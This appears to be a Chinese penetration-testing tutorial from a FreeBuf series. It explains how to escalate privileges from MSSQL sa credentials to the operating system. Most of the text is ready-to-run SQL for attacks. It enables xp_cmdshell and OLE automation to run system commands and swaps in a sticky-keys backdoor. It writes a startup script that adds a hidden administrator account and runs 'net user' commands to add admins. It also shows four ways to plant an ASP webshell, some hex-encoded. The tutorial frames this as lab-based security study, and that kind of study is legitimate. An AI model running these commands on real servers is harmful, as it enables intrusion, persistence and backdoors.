## 系列文章

> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)

## 简介

 **渗透测试-地基篇**

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

 **请注意** ：

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

名言：

你对这行的兴趣，决定你在这行的成就！

## 一、前言

数据库作为业务平台信息技术的核心和基础，承载着越来越多的关键数据，渐渐成为单位公共安全中最具有战略性的资产，数据库的安全稳定运行也直接决定着业务系统能否正常使用。并且平台的数据库中往往储存着等极其重要和敏感的信息。这些信息一旦被篡改或者泄露，轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。所以对数据库的保护是一项必须的，关键的，重要的工作任务。

通过前几期钓鱼、内网攻防篇章落幕后，引来了服务攻防篇章之数据库渗透篇，不管在外网还是内网环境，只要存在业务系统都存在数据库，在渗透测试对数据库的知识学习是必不可少的，接下来将介绍数据库的渗透基本操作，带小伙伴们了解和学习数据库如何渗透的！

如果获得MSSQL用户密码如何拿到对方服务器权限呢？接下来将把提权技巧告诉大家！

## 二、MSSQL-xp_cmdshell进行提权

### 1、简介

xp_cmdshell是Sql
Server中的一个组件，可以用来执行系统命令在拿到sa口令之后，经常可以通过xp_cmdshell来进行提权在这里以Windows Server 2019
和 Sql Server 2019 为例进行测试！

### 2、查看xp_cmdshell状态

1）首先通过管理工具来查看xp_cmdshell状态  
右击实例名-> Facets(A)

![1625816388_60e7fd44a65ac3ec5265a.png!small?1625816390982](https://image.3001.net/images/20210709/1625816388_60e7fd44a65ac3ec5265a.png!small?1625816390982)

![1625816394_60e7fd4a2ac0753d015d0.png!small?1625816394370](https://image.3001.net/images/20210709/1625816394_60e7fd4a2ac0753d015d0.png!small?1625816394370)

2）可以看到现在的xp_cmdshell是关闭状态  
![1625816398_60e7fd4ee2d4b0374cfbd.png!small?1625816399399](https://image.3001.net/images/20210709/1625816398_60e7fd4ee2d4b0374cfbd.png!small?1625816399399)

3）然后我们通过sql指令来查看是否存在xp_cmdshell  
右击数据库，新建查询，执行以下命令：

    
    
    select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
    

![1625816405_60e7fd55acf48eb77593d.png!small?1625816408574](https://image.3001.net/images/20210709/1625816405_60e7fd55acf48eb77593d.png!small?1625816408574)可以看到返回结果是1

### 3、开启xp_cmdshell

1）命令如下：

    
    
    EXEC sp_configure 'xp_cmdshell',1
    RECONFIGURE
    GO
    

![1625816423_60e7fd675dc4e6098082e.png!small?1625816425671](https://image.3001.net/images/20210709/1625816423_60e7fd675dc4e6098082e.png!small?1625816425671)![1625816417_60e7fd61414f7ba41fb66.png!small](https://image.3001.net/images/20210709/1625816417_60e7fd61414f7ba41fb66.png!small)可以看到报错提示xp_cmdshell不存在也可能是高级选项，前面已经通过命令查询存在xp_cmdshell组件，那只可能是高级选项！

2）通过命令开启允许编辑高级选项，命令如下

    
    
    EXEC sp_configure 'show advanced options', 1
    GO
    RECONFIGURE
    GO
    

![1625816431_60e7fd6ff0000a788f171.png!small?1625816435148](https://image.3001.net/images/20210709/1625816431_60e7fd6ff0000a788f171.png!small?1625816435148)

3）然后再去开启xp_cmdshell  
![1625816435_60e7fd73e717db4db7d72.png!small?1625816436373](https://image.3001.net/images/20210709/1625816435_60e7fd73e717db4db7d72.png!small?1625816436373)

配置选项 'xp_cmdshell' 已从 0 更改为 1！！

### 4、通过xp_cmdshell执行系统命令

通过xp_cmdshell执行系统命令指令如下

    
    
    master..xp_cmdshell 'whoami'
    
    EXEC master.dbo.xp_cmdshell 'ipconfig'
    

![1625816449_60e7fd815369d1cbfe3be.png!small?1625816450007](https://image.3001.net/images/20210709/1625816449_60e7fd815369d1cbfe3be.png!small?1625816450007)返回的权限是network
server，如果被降权那就无法完成提权。

![1625816664_60e7fe58ae31cf8c916bb.png!small?1625816665504](https://image.3001.net/images/20210709/1625816664_60e7fe58ae31cf8c916bb.png!small?1625816665504)

### 5、关闭xp_cmdshell

1）和刚才一样，只不过需要把1改为0

    
    
    EXEC sp_configure 'xp_cmdshell', 0
    GO
    RECONFIGURE
    GO
    

![1625816671_60e7fe5f8637a92ccc43b.png!small?1625816674240](https://image.3001.net/images/20210709/1625816671_60e7fe5f8637a92ccc43b.png!small?1625816674240)

2）同样，关闭高级选项编辑也是

![1625816677_60e7fe65d478836821f7d.png!small?1625816680080](https://image.3001.net/images/20210709/1625816677_60e7fe65d478836821f7d.png!small?1625816680080)

    
    
    EXEC sp_configure 'show advanced options', 1
    RECONFIGURE
    EXEC sp_configure 'xp_cmdshell',0
    RECONFIGURE
    

## 三、MSSQL-使用sp_oacreate进行提权

### 1、前言

如果xp_cmdshell扩展存储过程被删除或者无法使用，可以使用sp_oacreate和sp_oamethod调用系统wscript.shell来执行系统命令。sp_oacreate是一个非常危险的存储过程，可以删除、复制、移动文件，还能配合sp_oamethod来写文件执行cmd。sp_oacreate和sp_oamethod两个过程分别用来创建和执行脚本语言，换言之就是xp_cmdshell能执行的sp_oacreate＋sp_oamethod同样能胜任。

### 2、前提条件

    
    
    已获取到sqlserver sysadmin权限用户的账号与密码；
    
    SQLserver服务未降权：
    
    sqlserver可以外连；
    

### 3、判断sp_oacreate状态

在master.dbo.sysobjects中查看sp_oacreate状态，回显为1代表开启：

    
    
    select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE';
    

![1625816686_60e7fe6ed6ff1a76ad8ec.png!small?1625816687776](https://image.3001.net/images/20210709/1625816686_60e7fe6ed6ff1a76ad8ec.png!small?1625816687776)

### 4、未开启sp_oacreate状态

若未开启，执行以下命令开启sp_oacreate（启用 OLE Automation Procedures）。

#### 1）开启sp_oacreate

开启命令：

    
    
    exec sp_configure 'show advanced options',1;
    reconfigure;
    exec sp_configure 'Ole Automation Procedures',1;
    reconfigure;
    

![1625816703_60e7fe7fd906d0bbe3736.png!small?1625816707193](https://image.3001.net/images/20210709/1625816703_60e7fe7fd906d0bbe3736.png!small?1625816707193)当启用ole
automation procedures时，对sp_oacreate的调用将会启动OLE共享执行环境。

#### 2）关闭sp_oacreate

关闭命令：

    
    
    exec sp_configure 'show advanced options',1;
    reconfigure with override;
    exec sp_configure 'ole automation procedures',0;
    reconfigure with override;
    exec sp_configure 'show advanced options',0;
    reconfigure with override;
    

![1625816706_60e7fe823e3101f32bd39.png!small?1625816710953](https://image.3001.net/images/20210709/1625816706_60e7fe823e3101f32bd39.png!small?1625816710953)

### 5、开始提权

调用wscript.shell执行命令：

#### 1）查询命令

    
    
    declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\1.txt';
    

![1625816707_60e7fe838cc9171261ae5.png!small?1625816710953](https://image.3001.net/images/20210709/1625816707_60e7fe838cc9171261ae5.png!small?1625816710953)![1625816711_60e7fe87ccb4070824976.png!small?1625816711900](https://image.3001.net/images/20210709/1625816711_60e7fe87ccb4070824976.png!small?1625816711900)

#### 2）删除文件

    
    
    declare @result int
    declare @fso_token int
    exec sp_oacreate 'scripting.filesystemobject', @fso_token out
    exec sp_oamethod @fso_token,'deletefile',null,'c:\1.txt'
    exec sp_oadestroy @fso_token
    

![1625816730_60e7fe9a7dcd1881f0ae7.png!small?1625816740216](https://image.3001.net/images/20210709/1625816730_60e7fe9a7dcd1881f0ae7.png!small?1625816740216)

#### 3）复制文件

    
    
    declare @o int
    exec sp_oacreate 'scripting.filesystemobject',@o out
    exec sp_oamethod @o,'copyfile',null,'c:\1.txt','c:\2.txt'
    

![1625816730_60e7fe9ab241a059ca7dc.png!small?1625816740217](https://image.3001.net/images/20210709/1625816730_60e7fe9ab241a059ca7dc.png!small?1625816740217)

#### 4）替换粘贴键

    
    
    declare @o int
    exec sp_oacreate 'scripting.filesystemobject', @o out
    exec sp_oamethod @o,'copyfile',null,'c:\windows\explorer.exe', 'c:\windows\system32\sethc.exe'
    declare @oo int
    exec sp_oacreate 'scripting.filesystemobject', @oo i=out
    exec sp_oamethod @oo,'copyfile',null,'c:\windows\system32\sethc.exe','c:\windows\system32\dllcache\sethc.exe'
    

#### 5）启动项中写入添加账户脚本

    
    
    declare @sp_passwordxieo int, @f int, @t int, @ret int
    exec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out
    exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\1.vbs', 1
    exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject("WSCRIPT.NETWORK")'
    exec @ret = sp_oamethod @f, 'writeline', NULL,'os="WinNT://"&wsnetwork.ComputerName'
    exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'
    exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os&"/Administrators,group")'
    exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create("user","123$")'
    exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword "123"'
    exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo'
    exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os&"/123$",user)'
    exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&"/123$"';
    

#### 6）COM组件的利用(cmd.exe可以自行上传)

    
    
    declare @luan int,@exec int,@text int,@str varchar(8000);
    exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output; 
    exec sp_oamethod @luan,'exec',@exec output,'C:\\phpstudy\\www\\test.com\\cmd.exe /c whoami';
    exec sp_oamethod @exec, 'StdOut', @text out;
    exec sp_oamethod @text, 'readall', @str out
    select @str;
    

### 6、四种文件写入的方法

这几种文件写入的方法需要满足物理路径已知，拥有sa权限。

#### 1）第一种存储过程写文件

    
    
    declare @o int, @f int, @t int, @ret int
    exec sp_oacreate 'scripting.filesystemobject', @o out
    exec sp_oamethod @o, 'createtextfile', @f out, 'c:\\phpstudy\\www\\cbd.asp', 1
    exec @ret = sp_oamethod @f, 'writeline', NULL,'<%execute(request("a"))%>'
    

![1625816736_60e7fea0c96efcb22e098.png!small?1625816740217](https://image.3001.net/images/20210709/1625816736_60e7fea0c96efcb22e098.png!small?1625816740217)

#### 2）第二种存储过程写文件

    
    
    declare @s nvarchar(4000);select @s=0x730065006c00650063007400200027003c00250045007800650063007500740065002800720065007100750065007300740028002200610022002900290025003e000d000a002700;exec sp_makewebtask 0x43003a005c007a00770065006c006c002e00610073007000, @s;--    

#### 3）第三种log备份

    
    
    alter database 库名 set RECOVERY FULL 
    create table cmd (a image) 
    backup log 库名 to disk = 'c:\' with init 
    insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) 
    backup log 库名 to disk = 'c:\2.asp'
    

#### 4）第四种差异备份

    
    
    backup database 库名 to disk = 'c:\bak.bak';--    create table [dbo].[test] ([cmd] [image]);
    insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)
    backup database 库名 to disk='C:\d.asp' WITH DIFFERENTIAL,FORMAT;--    

### 6、创建用户

    
    
    declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user estelle 123456 /add'
    
    declare @shell int
    exec sp_oacreate 'wscript.shell',@shell  output
    exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net user estelle 123456 /add'
    exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net localgroup administrators estelle /add'
    

那么到这里，我已经把所有的提权MSSQL两种模块的技巧都传授出来了，能走多远在加固自身公司网络安全数据库的基础上，就看小伙伴能吸收多少了，加油！

## 四、总结

经过了安全三打版本的MSSQL后，在安全完的基础上进行了xp_cmdshell、sp_oacreate提权渗透的总结和演示，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍，接下来还有各种方法教给大家！

    
    
    服务攻防之数据库Mysql（上）-> 服务攻防之数据库Mysql（下）-> 服务攻防之数据库MSSQL（上）-> 服务攻防之数据库MSSQL（中）......
    

接下来在《服务攻防之数据库MSSQL（下）》会接触到如何对数据MSSQL进行沙盒、JOB、镜像劫持等渗透方法，请看下篇服务攻防之数据库MSSQL下篇章！

希望大家提高安全意识，没有网络安全就没有国家安全！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

作者：大余

